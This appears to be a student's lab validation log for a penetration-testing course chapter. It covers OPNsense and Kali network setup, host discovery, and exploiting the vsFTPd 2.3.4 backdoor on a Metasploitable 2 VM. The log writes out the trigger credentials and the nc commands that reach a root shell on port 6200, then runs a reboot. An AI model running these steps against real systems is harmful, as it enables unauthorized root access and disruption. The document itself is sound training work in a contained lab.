# Validation Notes – Chapter 1

## OPNsense Interface Assignment

OPNsense initially showed no assigned interfaces after installation. Interfaces were assigned manually.

Final assignments:

| Interface | Role |
|---|---|
| em0 | WAN |
| em1 | LAN |

After assignment, OPNsense showed:

```text
LAN (em1) -> 192.168.1.1/24
WAN (em0) -> DHCP address
```

## Kali DHCP Validation

Kali initially had only an IPv6 link-local address and no IPv4 address.

NetworkManager was used instead of dhclient because dhclient was not installed:

```bash
nmcli device status
sudo nmcli device connect eth0
ip addr
```

Confirmed Kali IPv4 address:

```text
192.168.1.188/24
```

## Discovery Test

From Kali:

```bash
sudo netdiscover -i eth0 -r 192.168.1.0/24
```

Discovered hosts:

```text
192.168.1.1      OPNsense LAN gateway
192.168.1.121    Metasploitable 2
192.168.1.165    Ubuntu Desktop
```

## Web Reachability Test

From Kali browser:

```text
http://192.168.1.121
```

Result:

Metasploitable web page loaded successfully.

## First Hack Validation

The Chapter 1 first hack was successful.

From Kali, I connected to the Metasploitable FTP service on port 21:

```bash
nc 192.168.1.121 21
```

The target responded:

```text
220 (vsFTPd 2.3.4)
```

I triggered the backdoor with:

```text
user Hacker:)
pass invalid
```

Then from a second Kali terminal, I connected to the backdoor shell on port 6200:

```bash
nc -v 192.168.1.121 6200
whoami
```

Output:

```text
root
```

I also ran:

```bash
reboot
```

The Metasploitable VM rebooted, confirming command execution on the target machine.

## Result

Chapter 1 internal lab networking and the first controlled exploit are validated.
